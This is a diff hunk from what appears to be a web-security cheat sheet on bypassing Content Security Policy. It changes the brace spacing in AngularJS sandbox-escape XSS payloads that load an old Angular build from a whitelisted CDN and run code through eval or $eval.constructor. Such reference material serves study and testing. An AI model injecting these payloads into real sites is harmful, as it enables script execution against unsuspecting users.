@@ -179,12 +179,12 @@ If the `script-src` is set to `self` and a javascript library domain is whitelis
  
 <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"></script>
 <div ng-app ng-csp>
-    {{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
+    { { x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") } }
 </div>
 
 "><script src="https://cdnjs.cloudflare.com/angular.min.js"></script>
 <div ng-app ng-csp>
-    {{$eval.constructor('alert(1)')()}}
+    { {$eval.constructor('alert(1)')()} }
 </div>
 
 "><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"></script>
